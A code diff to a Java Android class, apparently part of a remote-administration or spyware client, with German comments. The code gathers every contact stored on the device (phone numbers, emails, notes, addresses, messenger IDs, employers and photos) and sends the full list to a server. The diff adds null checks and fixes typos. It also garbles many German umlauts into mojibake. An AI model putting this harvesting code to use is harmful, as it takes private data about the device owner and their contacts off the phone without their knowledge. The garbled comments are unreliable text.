@@ -19,16 +19,16 @@ import my.app.client.ClientListener;
 import Packet.ContactsPacket;
 
 /**
- * Diese Klasse sammelt alles Informationen über die unterschiedlichen Kontatke, welche auf dem Gerät gespeichert sind.
+ * Diese Klasse sammelt alle Informationen Ã¼ber die auf dem GerÃ¤t gespeicherten Kontakte.
  */
 public class ContactsLister {
 
 	/**
 	 * Diese Methode sammelt alle Daten eines Kontaktes und speichert diesen dann in eine ArrayList.
-	 * Die ArrayList wird später zu einem Paket gepackt und an den Server geschicht.
+	 * Die ArrayList wird spï¿½ter in einem Paket gespeichert und an den Server geschickt.
  	 * @param c	Der Service der diese Methode aufruft.
-	 * @param channel	Kanal zur Datenübertragung
-	 * @param args	Filter nachdem die Kontakte gefilter werden sollen
+	 * @param channel	Kanal zur Datenï¿½bertragung
+	 * @param args	Filter welcher die Kontakte filtert
 	 * @return true wenn Kontakte vorhanden, false sosnt.
 	 */
 	public static boolean listContacts(ClientListener c, int channel, byte[] args) {
@@ -37,33 +37,33 @@ public class ContactsLister {
 		 */
 		ArrayList<Contact> l = new ArrayList<Contact>();
 		/**
-		 * boolean ret 	Hierbei handelt es sich um dern return-Wert. Er wird per default auf false gesetzt.
+		 * boolean ret 	Hierbei handelt es sich um den return-Wert. Er wird per default auf false gesetzt.
 		 */
 		boolean ret = false;
 		/**
-		 * WHERE_CONDITION	Die übergebenen Argumente dienen dazu die Kontakte nach belieben zu filtern.
+		 * WHERE_CONDITION	Die ï¿½bergebenen Argumente dienen dazu die Kontakte nach belieben zu filtern.
 		 */
 		String WHERE_CONDITION = new String(args);
 		/**
-		 * ContentResolver cr 	Dieser wird benötigt um an die gewünschten Daten zu kommen.
+		 * ContentResolver cr 	Dieser wird benï¿½tigt um die gewï¿½nschten Daten zu erhalten.
 		 * Daten werden unter Android mit Hilfe von ContentProvidern gespeichert und abgefragt.
 		 */
         ContentResolver cr = c.getContentResolver();
 		/**
 		 * Cursor cur	 Hier werden die Ergebnisse der Abfrage gespeichert.
 		 */
-        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null,WHERE_CONDITION, null, " DISPLAY_NAME ");
+        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null,WHERE_CONDITION, null, "DISPLAY_NAME ");
 		/**
-		 * Sollte cur mehr Elemente als 0 bestiten so beginnt die Schleife.
+		 * Sollte cur mehr Elemente besitzen so beginnt die Schleife.
 		 */
-        if (cur.getCount() > 0) {
+        if (cur!= null && cur.getCount() > 0) {
            while (cur.moveToNext()) {
 			   /**
 				* Erstellen eines neuen Kontakts zur Speicherung der erhaltenen Daten.
 				*/
         	   Contact con = new Contact();
 			   /**
-				* Die Daten werden aus der Varibalen cur ausgelesen und in den verschiedenen Variablen zwischengespeichert.
+				* Die Daten werden aus der Varibalen cur ausgelesen und in den Variablen zwischengespeichert.
 				*/
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                long idlong = cur.getLong(cur.getColumnIndex(ContactsContract.Contacts._ID));
@@ -73,7 +73,7 @@ public class ContactsLister {
                String disp_name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                int starred = cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.STARRED));
 			   /**
-				* Die Zwischengespeicehrten Daten werden dem Kontakt con hinzugefügt.
+				* Die Zwischengespeicehrten Daten werden dem Kontakt con hinzugefï¿½gt.
 				*/
                con.setId(idlong);
                con.setLast_time_contacted(last_time_contacted);
@@ -82,42 +82,45 @@ public class ContactsLister {
                con.setStarred(starred);
               
                /**
-				* Um die Telefonnummern abzufragen wird eine andere Tabelle benötigt. Hierzu wird der Kontaktname ausgelesen.
+				* Um die Telefonnummern abzufragen wird eine andere Tabelle benï¿½tigt. Hierzu wird der Kontaktname ausgelesen.
                 */
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
 			   /**
-				* Dann wird überprüft ob diesem Namen eine Telefonnummer hinterlegt ist
+				* Dann wird ï¿½berprï¿½ft ob diesem Namen eine Telefonnummer hinterlegt ist
 				*/
                if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
 				   /**
 					* Ist dies der Fall so wird nun eine neue ArrayList erstellt in der alle Telefonnummern des Kontakt gespeichert werden.
-					* Hierfür wird ein neuer Cursor erstellt.
+					* Hierfï¿½r wird ein neuer Cursor erstellt.
 					*/
                    // get the phone number
                    Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,
                                           ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?", new String[]{id}, null);
-                   ArrayList<String> phones = new ArrayList<String>();
-                   while (pCur.moveToNext()) {
-                         String phone = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                         phones.add(phone);
-                   }
+				   if(pCur != null &&pCur.getCount() != 0) {
+					   ArrayList<String> phones = new ArrayList<String>();
+					   while (pCur.moveToNext()) {
+						   String phone = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+						   phones.add(phone);
+					   }
+
+					   /**
+						* Der Cursor fï¿½r die Telefonnummern wird gelï¿½scht und die Liste dem Kontakt con hinzugefï¿½gt.
+						*/
+					   pCur.close();
+					   con.setPhones(phones);
+				   }
 				   /**
-					* Der Cursor für die Telefonnummern wird gelöscht und die Liste dem Kontakt con hinzugefügt.
-					*/
-                   pCur.close();
-                   con.setPhones(phones);
-				   /**
-					* Im nächsten Schritt werden die gespeicherten Email-Adressen ausgelesen.
-					* Auch hierfür muss wieder ein neuer cursor erstellt werden.
+					* Im nï¿½chsten Schritt werden die gespeicherten Email-Adressen ausgelesen.
+					* Auch hierfï¿½r muss wieder ein neuer cursor erstellt werden.
 					*/
                   // get email and type
                   Cursor emailCur = cr.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                            											null, ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                            											new String[]{id}, null);
 				   /**
-					* Überprüfen ob Email-Adressen vorhanden sind.
+					* ï¿½berprï¿½fen ob Email-Adressen vorhanden sind.
 					*/
-                  if(emailCur.getCount() != 0) {
+                  if(emailCur != null &&emailCur.getCount() != 0) {
 					  /**
 					   * Erstellen einer neuen ArrayListe zur Speicherung der dem Kontakt hinterlegten Email-Adressen.
 					   */
@@ -129,47 +132,47 @@ public class ContactsLister {
 	                       emails.add(email);
 	                   }
 					  /**
-					   * Cursor löschen.
+					   * Cursor lï¿½schen.
 					   */
 	                   emailCur.close();
 					  /**
-					   * Die Liste dem Kontakt hinzufügen.
+					   * Die Liste dem Kontakt hinzufï¿½gen.
 					   */
 	                   con.setEmails(emails);
                   }
 				   /**
 					* Im folgenden werden die den Kontakten hinterlegent Notizen ausgelesen und gespeichert.
-					* Auch hierfür ist wieder ein eigener Cursor von nötien um die gewünschten Daten zu erhalten
+					* Auch hierfï¿½r ist wieder ein eigener Cursor von nï¿½tien um die gewï¿½nschten Daten zu erhalten
 					* Die Filter um die Notizen von diesem bestimmten Kontakt zu erhalten werden in der Variable noteWhere gespeichert.
-					* Sollte es einen Filter für die Kontakte geben und nur bestimmte harausgesucht werden so werden diese in der Varibalen noteWhereParams gepspeichert.
+					* Sollte es einen Filter fï¿½r die Kontakte geben und nur bestimmte harausgesucht werden, werden diese in der Varibalen noteWhereParams gepspeichert.
 					*/
                    // Get note.......
                    String noteWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                    String[] noteWhereParams = new String[]{id, ContactsContract.CommonDataKinds.Note.CONTENT_ITEM_TYPE};
 				   /**
-					* Mit diesem Aufruf wird der Cursor gemäß den oben erstellten Bedingungen erstellt und die entsprechenden Notizdaten aus der Datenbank entnommen.
+					* Mit diesem Aufruf wird der Cursor gemï¿½ï¿½ den oben erstellten Bedingungen erstellt und die entsprechenden Notizdaten aus der Datenbank entnommen.
 					*/
                    Cursor noteCur = cr.query(ContactsContract.Data.CONTENT_URI, null, noteWhere, noteWhereParams, null);
 				   /**
-					* Hier wird überprüft ob der Cursor leer ist.
+					* Hier wird ï¿½berprï¿½ft ob der Cursor leer ist.
 					*/
-                   if(noteCur.getCount() != 0) {
+                   if(noteCur != null && noteCur.getCount() != 0) {
 					   /**
 						* Wenn nicht so wird eine neue ArrayListe notes erstellt, in der die Notizen gespeichert werden.
 						*/
                 	   ArrayList<String> notes = new ArrayList<String>();
 	                   if (noteCur.moveToFirst()) {
 						   /**
-							* Nun wird die Notiz aud dem Cursor extrahiert und zwischen gespeichert.
+							* Nun wird die Notiz aus dem Cursor extrahiert und zwischengespeichert.
 							*/
 	                       String note = noteCur.getString(noteCur.getColumnIndex(ContactsContract.CommonDataKinds.Note.NOTE));
 						   /**
-							* Im Anschluss wird die Notiz der notes-Liste hizugefügt.
+							* Im Anschluss wird die Notiz der notes-Liste hizugefï¿½gt.
 							*/
 	                       notes.add(note);
 	                   }
 					   /**
-						* Nun wird der Cursor nicht mehr benötigt daher wird er geschlossen und die notes-Liste wird dem Kontakt con hinzugefügt.
+						* Nun wird der Cursor nicht mehr benï¿½tigt. Er wird geschlossen und die notes-Liste wird dem Kontakt con hinzugefï¿½gt.
 						*/
 	                   noteCur.close();
 	                   con.setNotes(notes);
@@ -177,21 +180,21 @@ public class ContactsLister {
 
 				   /**
 					* Hier wird nun die Adresse ausgelesen.
-					* Die Filter und Where-Bedingungen sind diesselben wie beim Auslesen der Notizen.
+					* Die Filter und Where-Bedingungen sind die selben wie beim Auslesen der Notizen.
 					*/
                    //Get Postal Address....
                    String addrWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                    String[] addrWhereParams = new String[]{id, ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE};
 				   /**
-					* Den Cursor erstellen um die Adresse des richtigen Kontaks auszulesen.
+					* Den Cursor erstellen um die Adresse des richtigen Kontakts auszulesen.
 					*/
                    Cursor addrCur = cr.query(ContactsContract.Data.CONTENT_URI, null, addrWhere, addrWhereParams, null);
 				   /**
-					* Überprüfen ob der Cursor Daten enthält.
+					* ï¿½berprï¿½fen ob der Cursor Daten enthï¿½lt.
 					*/
-                   if(addrCur.getCount() != 0) {
+                   if(addrCur!= null && addrCur.getCount() != 0) {
 					   /**
-						* Solange es ein nächtes Objekt gibt den Cursor weitervorsetzen und die Daten auslesen.
+						* Solange es ein nï¿½chtes Objekt gibt den Cursor weitervorsetzen und die Daten auslesen.
 						*/
 	                   while(addrCur.moveToNext()) {
 						   /**
@@ -204,7 +207,7 @@ public class ContactsLister {
 	                       String country = addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY));
 	                       int type = addrCur.getInt(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.TYPE));
 						   /**
-							* Die Variablen werden dem con-Kontakt hinzugefügt
+							* Die Variablen werden dem con-Kontakt hinzugefï¿½gt
 							*/
 	                       con.setStreet(street);
 	                       con.setCity(city);
@@ -214,21 +217,21 @@ public class ContactsLister {
 	                       con.setType_addr(type);
 	                   }
 					   /**
-						* Der Cursor wird gelöscht.
+						* Der Cursor wird gelï¿½scht.
 						*/
 	                   addrCur.close();
                    }
 				   /**
-					* Erstellen eines neuen Cursor um die Intstant Messanger Daten auszulesen
+					* Erstellen eines neuen Cursor, um die Intstant Messanger Daten auszulesen
 					*/
                    // Get Instant Messenger.........
                    String imWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                    String[] imWhereParams = new String[]{id, ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE};
                    Cursor imCur = cr.query(ContactsContract.Data.CONTENT_URI, null, imWhere, imWhereParams, null);
 				   /**
-					* Überprüfen ob der Cursor Daten enthält
+					* ï¿½berprï¿½fen ob der Cursor Daten enthï¿½lt
 					*/
-                   if(imCur.getCount() != 0) {
+                   if(imCur!= null &&imCur.getCount() != 0) {
 					   /**
 						* ArrayListe erstellen um die Daten zu speichern.
 						*/
@@ -240,27 +243,27 @@ public class ContactsLister {
 	                       String imName = imCur.getString(imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.DATA));
 	                       //String imType = imCur.getString(imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.TYPE));
 						   /**
-							* Variable der ArrayListe hinzufügen
+							* Variable der ArrayListe hinzufï¿½gen
 							*/
 						   ims.add(imName);
 	                   }
 					   /**
-						* Cursor löschen und die ArrayListe dem Varibalen con hinzufügen.
+						* Cursor lï¿½schen und die ArrayListe dem Kontakt con hinzufï¿½gen.
 						*/
 	                   imCur.close();
 	                   con.setMessaging(ims);
                    }
 				   /**
-					* Cursor erstellen um die Organisationsdaten des richtigen Kontakts zu erhalten.
+					* Cursor erstellen, um die Organisationsdaten des richtigen Kontakts zu erhalten.
 					*/
                    // Get Organizations.........
                    String orgWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                    String[] orgWhereParams = new String[]{id, ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE};
                    Cursor orgCur = cr.query(ContactsContract.Data.CONTENT_URI, null, orgWhere, orgWhereParams, null);
 				   /**
-					* Überprüfen ob der Cursor Daten enthält.
+					* ï¿½berprï¿½fen ob der Cursor Daten enthï¿½lt.
 					*/
-                   if(orgCur.getCount() != 0) {
+                   if(orgCur!=null && orgCur.getCount() != 0) {
 	                   if (orgCur.moveToFirst()) {
 						   /**
 							* Daten aus dem Cursor auslesen und in Variablen zwischenspeichern.
@@ -268,18 +271,18 @@ public class ContactsLister {
 	                       String orgName = orgCur.getString(orgCur.getColumnIndex(ContactsContract.CommonDataKinds.Organization.DATA));
 	                       String title = orgCur.getString(orgCur.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TITLE));
 						   /**
-							* Daten der Variablen con hinzufügen.
+							* Daten der Variablen con hinzufï¿½gen.
 							*/
 	                       con.setOrganisationName(orgName);
 	                       con.setOrganisationStatus(title);
 	                   }
 					   /**
-						* Den Cursor löschen.
+						* Den Cursor lï¿½schen.
 						*/
 	                   orgCur.close();
                    }
 				   /**
-					* Hier wird nun abschließend noch das mit dem Kontakt verknüpfte Bild ausgelesen.
+					* Hier wird nun abschlieï¿½end noch das mit dem Kontakt verknï¿½pfte Bild ausgelesen.
 					*/
                    //Picture Image
            	    	Uri uri = ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI, idlong);
@@ -292,7 +295,7 @@ public class ContactsLister {
 	        	              	        
 	        	        ByteArrayOutputStream bos = new ByteArrayOutputStream();
 						/**
-						 * In PNG-Datein kompromieren.
+						 * In PNG-Datein komprimieren.
 						 */
 	        	        pic.compress(CompressFormat.PNG, 0 /*ignored for PNG*/, bos);
 						/**
@@ -300,13 +303,13 @@ public class ContactsLister {
 						 */
 						byte[] bitmapdata = bos.toByteArray();
 						/**
-						 * bitmapdata der Vatiablen con hinzufügen.
+						 * bitmapdata der Vatiablen con hinzufï¿½gen.
 						 */
 	        	        con.setPhoto(bitmapdata);
 	        	        //Bitmap bitmap = BitmapFactory.decodeByteArray(bitmapdata , 0, bitmapdata .length);
 	        	    }
 				   /**
-					* Den erstellten Kontakt der ArrayListe l hinzufügen.
+					* Den erstellten Kontakt der ArrayListe l hinzufï¿½gen.
 					*/
 	        	    l.add(con);
                }
@@ -324,12 +327,12 @@ public class ContactsLister {
     	  ret = false;
 
 		/**
-		 * Neues ContactsPacket erstellen und diesem die Liste l übergeben.
+		 * Neues ContactsPacket erstellen und diesem die Liste l ï¿½bergeben.
 		 * Danach wird das Packet an den Server gesendet.
 		 */
       c.handleData(channel, new ContactsPacket(l).build());
 		/**
-		 * Die Variable ret wird zurückgegeben.
+		 * Die Variable ret wird zurï¿½ckgegeben.
 		 */
       return ret;
 	}
